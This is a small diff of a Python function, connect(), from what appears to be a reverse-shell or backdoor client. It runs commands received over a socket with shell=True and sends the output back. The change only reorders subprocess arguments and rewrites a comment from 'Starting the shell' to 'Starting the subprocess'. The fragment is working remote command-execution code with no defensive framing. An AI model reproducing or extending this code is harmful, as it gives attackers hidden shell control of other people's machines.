@@ -38,7 +38,7 @@ def connect():
                 pass
             
         else:
-            CMD=subprocess.Popen(command,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE,shell=True)  #Starting the shell
+            CMD=subprocess.Popen(command,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)  #Starting the subprocess
             s.send(CMD.stdout.read())  #Send the result
             s.send(CMD.stderr.read())  #Exception Handling
 
